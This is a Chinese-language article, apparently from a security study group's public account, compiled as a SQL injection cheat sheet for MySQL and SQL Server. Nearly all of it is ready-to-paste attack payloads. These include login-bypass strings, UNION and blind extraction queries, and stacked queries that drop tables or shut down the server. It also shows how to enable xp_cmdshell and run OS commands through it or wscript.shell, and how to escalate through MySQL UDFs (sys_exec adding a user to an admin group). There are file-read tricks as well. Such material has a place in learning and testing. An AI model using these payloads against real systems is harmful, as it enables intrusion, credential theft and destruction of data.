信安之路的小白成长阶段目前处于 SQL 的基础学习阶段，在每一个学习阶段都会分享一些参考资料给大家，即使大家未能成为学习的主力，但是也希望更多想要参与学习的同学跟着这个学习计划一直前行，详细情况请看**公众号菜单中间一栏的成长计划。**

### Mysql 学习基础

#### 使用 nmap 对 mysql 数据库进行扫描

> nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -p 3306

#### 与 mysql 数据库相关的重要文件

> ~/.mysql_history

> mysqli_connect.php

#### 使用 mysql 的常用命令

连接数据库：

> mysql -h <ip> -P <port> -u <user> -p <password>

列出数据库:

> show databases;

选择数据库：

> use <database>

列出表名：

> show tables;

使用系统表，查询用户：

> use mysql; 

> select * from user;

获取当前用户的权限：

> show grants;

#### 在获取 mysql 基本信息时用到的小技巧

获取版本信息：

> select @@version

获取当前用户：

> select user(); select system_user()

获取当前数据库：

> select database()

获取主机名：

> select @@hostname

获取数据库文件路径：

> select @@datadir

列出用户的账号密码哈希：

> select host, user, password from mysql.user

查询所有内容通过一个字符串列出：

> select group_concat(name separator %27,%27) from users
>
> select group_concat(cast(uid as char(50)) separator %27,%27) from users

将文件的权限赋予指定用户

> GRANT FILE ON *.* TO ''@'localhost'

扩展学习：

> http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

#### 如何执行系统命令

> http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/

1、检查文件 /usr/lib/lib_mysqludf_sys.so 是否存在：

> whereis lib_mysqludf_sys.so

2、如果存在：

> mysql -u root -p ... mysql> select sys_exec('');

`sys_exec` 执行完返回退出状态

`sys_eval` 返回标准输出

3、增加用户到管理员组：

> mysql> select sys_exec('usermod -a -G admin <user>');

4、如果用户有权限，则复制文件： `lib_mysqludf_sys.so` 到 /usr/lib/ 目录下

5、如何编译 lib_mysqludf_sys.so ：

> git clone https://github.com/mysqludf/lib_mysqludf_sys
>
> gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o ./lib_mysqludf_sys.so

### SQL 注入手册

下面是关于下文中数据库对应的字母表：

![img](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfcvlqNqemtmU8gWoAfOu05d8kzHjr1ojv7H5nS3EAuOhxPNZeibyKz8P47a7nIFOFmicThS14iagEZFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##### Examples：

- (MS) 表示: MySQL 和 SQL Server 数据库通常情况下
- (M*S) 表示 : MySQL 的某些特定情况以及 SQL Server 的一般情况

#### 参考语法、注入技巧

##### 行末注释符

**注释掉行末其他部分：**

- `--`(SM) 
- `#`(M)

**在登录口注入的实例：**

- 用户名:`admin'--`
- `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'` 以上语句中 `—`后面的内容被注释，导致语句执行成功，从而绕过认证。

##### 语句中注释

可以用来绕过黑名单拦截，例如：

- `/*Comment Here*/` **(SM)**

  `DROP/*comment*/sampletable`

  `DR/**/OP/*bypass blacklisting*/sampletable`

  `SELECT/*avoid-spaces*/password/**/FROM/**/Members`

- `/*! MYSQL Special SQL *`/ (M) 这种情况只针对 Mysql 有效

  `SELECT /*!**32302** 1/0, */ 1 FROM tablename`

##### 经典的内联注入的攻击实例

- ID: `10; DROP TABLE members /*`
  像语句 `10; DROP TABLE members --` 是同样的效果
- `SELECT /*!**32302** 1/0, */ 1 FROM tablename`
  如果 MySQL 版本高于 3.23.02，那么就不会报错

##### MySQL 版本检测

- ID: `/*!``**32302** 10*/`
- ID: `10`
  如果 MySQL 版本高于 3.23.02，两个结果返回一致
- `SELECT /*!**32302** 1/0, */ 1 FROM tablename`
  如果 MySQL 版本高于 3.23.02，那么就不会报错

#### 堆叠查询

- `;` (S)
  `SELECT * FROM members; DROP members--`

结束一个查询，并开始下一个查询

##### 堆叠查询支持表

![img](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfcvlqNqemtmU8gWoAfOu05dl8R7yrZibSSQSiavqz8o3vkia5vf0UvBELpI55UGjZ35YJw0hj8k4P9Ew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



##### 使用堆叠注入的攻击实例

- ID: `10;DROP members --`
- `SELECT * FROM products WHERE id = 10; DROP members--`

在正常执行完前一个语句后，会删除用户表 

#### if 函数

这个利用方式在盲注过程中非常关键

##### MySQL If 函数

- `IF(**condition,true-part,false-part**)`(M)`SELECT IF(1=1,'true','false')`

##### SQL Server If 函数 

- `IF **condition** **true-part** ELSE **false-part**` (S)  `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

##### If 函数在 SQL 注入攻击中的实例

`if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0` (S) 

当前用户不是 **"sa" 或 "dbo"** 时则不会报错

#### 使用数字类型

可以绕过 magic_quotes() 和一些过滤, 甚至是常见的 WAFs. 

- `0x*HEXNUMBER*` (SM) 

- 你也可以像下面这样写

  `SELECT CHAR(0x66)` (S)
  `SELECT 0x5045` (将字符串进行 hex 编码) (M)
  `SELECT 0x50 + 0x45` (M) 

#### 字符串操作

将字符串进行各种字符操作的变形，可以绕过一些防御方式

##### 字符串连接

- `+` (S)
  `SELECT login + '-' + password FROM members`
- `||` (*MO)
  `SELECT login || '-' || password FROM members`

**关于 MySQL 的 "||";** 如果 MySQL 在 ANSI 模式下运行会起作用，否则 Mysql 会将其作为逻辑运算符将它返回 0 ，使用 `CONCAT()` 函数会更好

- `CONCAT(str1, str2, str3, ...)` (M) 

  连接提供的字符串：`SELECT CONCAT(login, password) FROM members`

#### 不带引号的字符串

可以使用 `CHAR()`(MS) 和 `CONCAT()`(M) 来生成不带引号的字符串

- `0x457578` (M) - 字符串 hex 后的值 `SELECT 0x457578` 在 Mysql 中可以使用下面的语句生产这个字符串：`SELECT CONCAT('0x',HEX('c:\\boot.ini'))`
- Using `CONCAT()` in MySQL
  `SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))` (M)
  这个语句将返回 ‘KLM’
- `SELECT CHAR(75)+CHAR(76)+CHAR(77)` (S)
  这个语句将返回 ‘KLM’

##### 基于 HEX 的注入实例

- `SELECT LOAD_FILE(0x633A5C626F6F742E696E69)` (M) 该语句展示的内容是 **c:\boot.ini**

#### 字符串修改相关

- `ASCII()` (SMP)
  返回字符串的 ASCII 码，在盲注中使用最多，例如：`SELECT ASCII('a')`
- `CHAR()` (SM)
  将数字转化为 ASCII 字符，例如：`SELECT CHAR(64)`

#### 联合查询

使用 union 可以跨表进行查询

```
SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
```

这条语句会返回两个表中的内容。 

另一个例子：

```
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
```

#### UNION – 解决语言设置的问题

虽然利用 Union 注入有时会因为不同的语言设置（表设置，字段设置，组合表/数据库设置等）而出错，下面的这些功能可以解决这个问题，经常会在处理日语、俄语、西班牙语等应用程序时遇到。

- SQL Server (S)
  使用 `field` **COLLATE**`SQL_Latin1_General_Cp1254_CS_AS`，详细介绍可以看 sql server 的官方文档，例子：`SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members`
- MySQL (M)
  `Hex()`可以解决所有问题

#### 绕过登录认证 (SMO+) 

登录测试的万能密钥：

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- .... 
- 使用不同的用户登录 (SM*)  `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

老版本的 Mysql 不支持 Union 查询

#### 通过密码字段绕过登录系统

如果应用程序首先通过用户名获取记录，然后将返回的 MD5 与提供的密码的 MD5 进行比较，那么您需要一些额外的技巧来欺骗应用程序以绕过身份验证。您可以使用已知密码和提供密码的 MD5 哈希结果来测试。在这种情况下，应用程序将比较您的密码和您提供的 MD5 哈希，而不是数据库中的 MD5。

##### 绕过登录实例 (MSP) 

Username :`admin`
Password : `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055`

> 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234) 

#### 基于报错列出所有列名

##### 使用 HAVING BY 查找列名称 (S) 

- '`HAVING 1=1 --`
- `' GROUP BY **table.columnfromerror1** HAVING 1=1 --`
- `' GROUP BY **table.columnfromerror1, columnfromerror2** HAVING 1=1 --`
- `' GROUP BY **table.columnfromerror1, columnfromerror2, columnfromerror(n)** HAVING 1=1 --` 等等
- 在没有收到任何错误的时候则表示已经列完

##### 使用 SELECT 中的 **ORDER BY** 来查出列的数量**(MSO+)**

- `ORDER BY 1--`
- `ORDER BY 2--`
- `ORDER BY N—` *等*
- 直到报错，这是你就已经找到了该语句对应的列数 

#### 跟 UNION 相关的数据类型

##### 提示

1、使用 union 查询时，最好使用 union 和 all 的搭配

2、如果不显示左表的内容需要把左 SQL 设为假，可以是 -1 或者不存在的条件

3、在 union 查询时，填充字符最好使用 NULL

##### 找出列的类型

- `' union select sum(columntofind) from users--` (S)
  Microsoft OLE DB Provider for ODBC Drivers error '80040e07'  [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.

  如果没有报错，则证明该列是数字类型的

- 还可以使用：`CAST()` 或 `CONVERT()`

  `SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`

- `11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-`

  没报错，使用的是 MS SQL

- `11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-`
  没报错，说明第一列是数字类型

- `11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 —` 报错了，说明第二列不是数字类型

- `11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-`
  没报错，说明第二列是字符类型

- `11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-`
  报错了，说明第三列不是数字类型，报错信息：`Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.`

在使用 union 时，参数有可能会在函数 `convert()` 中，所以要先闭合 `convert()` 函数然后再进行 union

#### Insert 例子 (MSO+) 

> '; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*

#### 功能函数

**@@version** (MS) 

这个函数可以在任何位置，不需要提供任何表名，还可以在插入或者更新语句中使用。

> INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

##### Bulk insert(S) 

将文件内容插入表中，然后读取表的内容，从而实现文件内容的读取，比如读取 iis 6.0 中的元文件 `%systemroot%\system32\inetsrv\MetaBase.xml`

1、创建一个表 foo( line varchar(8000) ) 

2、从文件 'c:\inetpub\wwwroot\login.asp' 中读取内容并插入表 foo 中

3、删除临时表 foo，重复读取其他的文件

##### BCP (S) 

将数据库中的内容写入文件中

> bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar 

##### 在 SQL Server 中使用 VBS, WSH 脚本 (S) 

因为 SQL Server 支持 ActiveX，所以你可以使用 VBS, WSH 脚本

> declare @o int
>
> exec sp_oacreate 'wscript.shell', @o out 
>
> exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
>
> Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- 

##### 使用 xp_cmdshell 执行系统命令 (S) 

在 *SQL Server 2005 中时默认禁掉的，如果有管理员权限可以开启。

> EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'

##### 在SQL Server 中的一些关键表(S) 

- 错误信息：`master..sysmessages`
- 连接的服务器：`master..sysservers`
- 密码字段（2000 和 2005 的密码哈希是可以破解的）SQL Server 2000:`masters..sysxlogins` ，SQL Server 2005 : `sys.sql_logins`

##### SQL Server 的存储过程 (S) 

1. 命令执行 (**xp_cmdshell**)  `exec master..xp_cmdshell 'dir'`

2. 注册表 相关(xp_regread) 

3. 1. xp_regaddmultistring 
   2. xp_regdeletekey 
   3. xp_regdeletevalue 
   4. xp_regenumkeys 
   5. xp_regenumvalues 
   6. xp_regread 
   7. xp_regremovemultistring 
   8. xp_regwrite
      exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
      exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities' 

4. 服务管理 (**xp_servicecontrol**) 

5. 媒体 (**xp_availablemedia**) 

6. ODBC 资源 (**xp_enumdsn**) 

7. 登录模块 (**xp_loginconfig**) 

8. 创建 Cab 文件 (**xp_makecab**) 

9. 域枚举 (**xp_ntsec_enumdomains**) 

10. kill 进程 (*需要 PID*) (**xp_terminate_process**) 

11. 增加新的存储过程 (可以执行任何你想做的)
    sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver 

12. 将文本内容写入 UNC 或 内部路径 (sp_makewebtask) 

##### MSSQL Bulk 提示 

> SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/ 
>
> DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0

HOST_NAME() 

IS_MEMBER (Transact-SQL) 

IS_SRVROLEMEMBER (Transact-SQL) 

OPENDATASOURCE (Transact-SQL) 

> INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"

你不能在 SQL Server 的插入语句中使用子查询

##### SQL 中使用 LIMIT (M) 或 ORDER (MSO)

> SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;

##### 关掉 SQL Server (S)

当你真的要关闭时使用：`';shutdown --`

#### 开启 xp_cmdshell 在 SQL Server 2005 中

> EXEC sp_configure 'show advanced options',1 RECONFIGURE
>
> EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE

#### 查询 SQL Server 的数据库结构(S) 

##### 获取用户定义的表

> SELECT name FROM sysobjects WHERE xtype = 'U'

##### 获取列名

> SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')

#### 判断记录 (S)

- 在 where 条件中使用 **NOT IN** 或 **NOT EXIST**, `... WHERE users NOT IN ('First User', 'Second User')` `SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)` *
- 复杂的技巧 `SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int` `Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21`

#### 基于 MSSQL 的报错注入快速提取数据的技巧 (S)

> ';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--

#### SQL 盲注

通过页面的显示状态来判断 SQL 语句的执行结果是 TRUE 还是 FLASE 来获取数据库中的数据

**TRUE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 

**FALSE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 

**TRUE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<103-- 

**FALSE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 

**TRUE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<89-- 

**FALSE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 

**TRUE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<83-- 

**FALSE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 

**FALSE** : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<80-- 

以上的测试过程就是正常情况下的盲注测试过程

##### 基于时间的盲注

由于 SQL 语句在执行成功和失败的时候，所用的时间不同，本来时间是很短的，人是无法察觉的，所以可以设置执行成功之后增加等待时间，从而判断执行是否成功。

**设置等待时间 (S)**

> WAITFOR DELAY '0:0:10'--

也可以设置的短一些

> WAITFOR DELAY '0:0:0.51'

**真实的例子：**

- 当前用户是否是 'sa' ? `if (select user) = 'sa' waitfor delay '0:0:10'`
- ProductID = `1;waitfor delay '0:0:10'--`
- ProductID =`1);waitfor delay '0:0:10'--`
- ProductID =`1';waitfor delay '0:0:10'--`
- ProductID =`1');waitfor delay '0:0:10'--`
- ProductID =`1));waitfor delay '0:0:10'--`
- ProductID =`1'));waitfor delay '0:0:10'--`

##### BENCHMARK() (M)

滥用这个命令会让 mysql 停一下，会大量消耗 web 服务器资源

> BENCHMARK(howmanytimes, do this)

**真实的例子：**

- 判断当前用户是否是 root `IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`
- 检查 MySQL 中的表 login 是否存在 `IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`

##### pg_sleep(seconds) (P)

睡眠几秒

- `SELECT pg_sleep(10);` 睡眠 10 秒

#### 测试注入的小技巧

> product.asp?id=4 (SMO) 

1. `product.asp?id=5-1`
2. `product.asp?id=4 OR 1=1`

> product.asp?name=Book

1. `product.asp?name=Bo’%2b’ok`
2. `product.asp?name=Bo’ || ’ok (*OM*)`
3. `product.asp?name=Book’ OR ‘x’=’x`

#### Mysql 的其他提示

- 子查询只能在 MySQL 4.1 以上版本使用

- 查询用户信息：`SELECT User,Password FROM mysql.user;`

- `SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;`

- `SELECT ... INTO DUMPFILE` 将数据库内容写入一个新文件 ，不能写入已存在的文件

- UDF 功能 

- - 创建一个函数 LockWorkStation 返回一个整数命名为 'user32';`
  - select LockWorkStation(); 
  - 创建一个函数 ExitProcess 返回一个整数命名为 'kernel32';
  - select ExitProcess()

- `SELECT USER();`

- `SELECT password,USER() FROM mysql.user;`

- 获取 admin 密码的第一个字节：`SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;`

- 读文件：`query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`

- MySQL 从文件中读数据：`create table foo( line blob ); load data infile 'c:/boot.ini' into table foo; select * from foo;`

- `select benchmark( 500000, sha1( 'test' ) );`

- `query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`

- `select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );`

  枚举猜测数据：`select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );`

##### 一些有用的 Mysql 功能函数

- `MD5()` MD5 哈希
- `SHA1()` SHA1 哈希
- `PASSWORD()`
- `ENCODE()`
- `COMPRESS()` 压缩数据，在盲注中读取大型二进制文件时比较好用
- `ROW_COUNT()`
- `SCHEMA()`
- `VERSION()` 类似于 `@@version`